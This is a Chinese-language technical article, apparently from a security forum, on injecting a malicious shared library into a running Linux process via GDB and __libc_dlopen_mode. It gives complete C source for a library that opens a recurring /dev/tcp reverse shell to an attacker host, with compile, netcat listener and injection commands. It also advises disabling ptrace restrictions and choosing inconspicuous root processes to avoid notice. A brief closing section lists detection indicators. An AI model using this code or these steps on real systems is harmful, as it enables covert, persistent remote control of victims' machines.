### 概述

GNU调试器（GDB，GNU Debugger）是一个开源的、强大的调试工具，被广泛应用于类Unix的操作系统。GDB的主要功能之一是允许开发者在程序运行时观察和控制程序的执行流程。通过GDB，开发者可以设置断点，即程序执行到某个特定点时会暂停，这样开发者就可以查看此时的程序状态，如变量的值、寄存器的状态、堆栈的内容等。此外，GDB还提供了单步执行、步入/步出函数、查看调用堆栈、修改内存内容等丰富的调试功能。本文浅析下如何在gdb调试的进程中动态调用库函数。

在某些复杂的调试场景中，开发者可能需要让被调试的进程调用特定的库函数来进一步测试程序的行为。为此，GDB提供了几种不同的方法来加载和运行库函数。其中，libdl库的dlopen(3)函数是最常见的方法之一。它允许程序在运行时动态地加载共享库，并执行其中的函数。然而，这种方法有一个限制：它要求主机进程在编译时链接到libdl库。

为了解决这个问题，GDB提供了另一种方法：使用libc库中的\_\_libc\_dlopen\_mode函数。这个函数与dlopen(3)类似，但它不需要主机进程在编译时链接到libdl库。这意味着，即使主机程序没有显式地链接到libdl，开发者仍然可以通过GDB在被调试的进程中动态加载库并调用其中的函数。

使用\_\_libc\_dlopen\_mode函数，开发者可以在GDB的命令行界面中输入相应的命令，指定要加载的库和要调用的函数。GDB将负责处理所有的细节，包括加载库、定位函数以及调用它们。这使得开发者能够灵活地控制程序的执行流程，进行更深入的调试分析。

### ptrace

ptrace系统调用是Linux内核提供的一个强大机制，它允许一个进程（观察和控制另一个进程的执行。这种能力使得开发者能够深入了解程序的运行时行为，从而进行调试、分析和优化。GDB（GNU调试器）就是利用了ptrace机制来实现其对目标程序的调试功能，而诸如strace这样的系统工具也依赖于ptrace来跟踪系统调用和信号。

在Linux系统中，出于安全考虑，ptrace的使用权限受到了严格的限制。默认情况下，只有root用户才能使用ptrace来附加到其他用户的进程。这是因为，如果允许任何用户都能够附加到其他用户的进程，那么恶意用户就可能利用这一机制来窃取敏感信息、篡改程序行为或进行其他形式的攻击。

除了通过修改程序运行权限来影响ptrace的行为外，开发者还可以通过修改内核参数来改变其默认行为。例如，他们可以通过设置kernel.yama.ptrace\_scope参数来控制哪些用户可以附加到哪些进程。默认情况下，这个参数的值是1，表示只有root用户才能附加到其他用户的进程。但是，如果开发者将其设置为0，那么任何用户都可以附加到其他用户的进程。

> sysctl kernel.yama.ptrace\_scope=0  
> \# or  
> echo 0 &gt; /proc/sys/kernel/yama/ptrace\_scope

### 实施流程

#### 选择注入进程

为了执行注入代码的操作，首先需要确定一个合适的进程作为目标。执行如下命令会获取一个不包含内核线程的进程列表。每个进程都会显示其进程ID、所属用户以及启动该进程的命令行参数。

> root@ubuntu:~# ps -fxo pid,user,args | egrep -v ' \\\[\\S+\\\]$'

![](https://shs3.b.qianxin.com/attack_forum/attach-3dea37cad4e202ecad55f.png)

在选择注入代码的进程时，确实需要考虑多个因素，包括进程的持久性、权限级别、以及它是否执行关键或敏感操作。长时间运行的进程，尤其是那些被视为“后台”进程或服务，通常不易被用户注意到，因此是潜在的注入对象。这些进程通常执行一些系统级的任务，如守护进程或系统服务，它们通常不是用户日常交互的一部分，因此减少了被结束的风险。低PID（进程ID）的进程也是一个潜在的好选择，因为它们通常在系统启动时就已经开始运行，而且它们通常是系统关键服务的一部分。注入到以root身份运行的进程中，尤其是那些执行系统级任务的进程，可以赋予注入的代码更高的权限。然而，这也增加了被系统安全机制检测到并阻止的风险，因为root权限的滥用通常会被视为恶意行为。

在选择注入目标时，理想的情况是找到一个既无人关注又无实际操作的进程。这样的进程通常不会对系统或用户造成直接的影响，因此即使注入代码在其中执行，也不太可能引起注意。然而，这样的进程可能并不容易找到，因为大多数系统进程都有其特定的任务和功能。

#### 编写恶意软件

```C++
#include <pthread.h>
#include <stdlib.h>
#include <unistd.h>
#define SLEEP 120 /\* 反连的休眠时间 \*/
#define CBADDR "ip" /\* 反连地址 \*/
#define CBPORT "4444" /\* 反连端口 \*/
/\* 反弹shell命令 \*/
#define CMD "echo 'exec >&/dev/tcp/"\\
CBADDR "/" CBPORT "; exec 0>&1' | /bin/bash"
void \*callback(void \*a);
\_\_attribute\_\_((constructor))
void start\_callbacks()
{
pthread\_t tid;
pthread\_attr\_t attr;
if (-1 == pthread\_attr\_init(&attr)) {
return;
}
if (-1 == pthread\_attr\_setdetachstate(&attr,
PTHREAD\_CREATE\_DETACHED)) {
return;
}
pthread\_create(&tid, &attr, callback, NULL);
}
void \*callback(void \*a)
{
for (;;) {
system(CMD);
sleep(SLEEP);
}
return NULL;
}
```

上述代码表示每隔2分钟会在指定ip、端口上生成一个反向shell。使用如下命令编译该文件

> cc -O2 -fPIC -o libcallback.so ./callback.c -lpthread -shared

#### 代码注入

上一节我们已经编译了一个可注入的库，首先在攻击机器上执行如下命令获取反弹shell。

> nc -lvp 4444

接下来使用\_\_libc\_dlopen\_mode函数执行加载，该函数允许程序动态地加载和链接共享库。它接受两个参数：路径和加载模式。攻击者需要选择一个合适的路径来放置恶意库文件。通常选择/usr/lib。设置\_\_libc\_dlopen\_mode的加载模式通常是使用RTLD\_NOW标志（值为2），在dlopen调用时立即解析所有未定义的符号。这可以确保库中的所有函数和变量在加载时都是可用的，但是加载过程变慢，因为所有符号都需要被解析。有时候攻击者可能会考虑使用RTLD\_LAZY标志（值为1），它会在第一次引用符号时才进行解析，从而提高加载速度，但这也可能增加了被安全防护机制检测到的风险。

如下在受害主机上执行命令，即可在攻击机器上获取一个shell。

> root@ubuntu:~/gdb\_shell# echo 'print \_\_libc\_dlopen\_mode("/root/gdb\_shell/libcallback.so", 2)' | gdb -p 3158

![](https://shs3.b.qianxin.com/attack_forum/attach-3dea37cad4e202ecad55f.png)

攻击机器：

![](https://shs3.b.qianxin.com/attack_forum/attach-3dea37cad4e202ecad55f.png)

### 入侵检测特征

#### 进程信息

当恶意软件试图注入到另一个进程中并执行其恶意代码时，它可能会创建一些异常的子进程。如下在进程列表中存在反弹shell行为。

![](https://shs3.b.qianxin.com/attack_forum/attach-3dea37cad4e202ecad55f.png)

#### 内存信息

一旦恶意库文件被加载到内存中，它的映射信息会出现在进程的内存映射文件中，如 /proc/\[pid\]/maps。这个文件包含了进程地址空间的详细信息，包括已加载的库文件的起始和结束地址、权限等信息。

cat /pid/pid/maps

![](https://shs3.b.qianxin.com/attack_forum/attach-3dea37cad4e202ecad55f.png)

如果攻击者把恶意库文件删除了，那么可以在进程的fd目录下（/proc/\[pid\]/fd/）看到“(deleted)”特征。

### 备注

使用GDB注入进程的时候，一旦库被加载并运行，它将对整个进程产生影响。如果库中发生任何问题，它将影响整个进程的稳定性。另外，如果恶意库的输出到syslog，意味着任何与该进程相关的日志和系统监控信息都将包含库的输出和行为。